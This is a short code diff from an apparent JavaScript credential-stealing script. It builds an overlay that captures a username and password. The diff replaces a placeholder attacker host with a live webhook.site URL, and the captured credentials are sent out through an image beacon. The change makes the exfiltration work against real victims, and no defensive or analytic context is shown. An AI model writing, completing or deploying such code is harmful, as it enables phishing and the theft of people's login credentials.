@@ -38,7 +38,7 @@
 
     // Send via GET request using an image beacon
     const img = new Image();
-    img.src = `https://your-attacker-server.com/log?user=${user}&pass=${pass}`;
+    img.src = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?user=${user}&pass=${pass}`;
 
     // Optional: remove the overlay after sending
     document.body.removeChild(overlay);
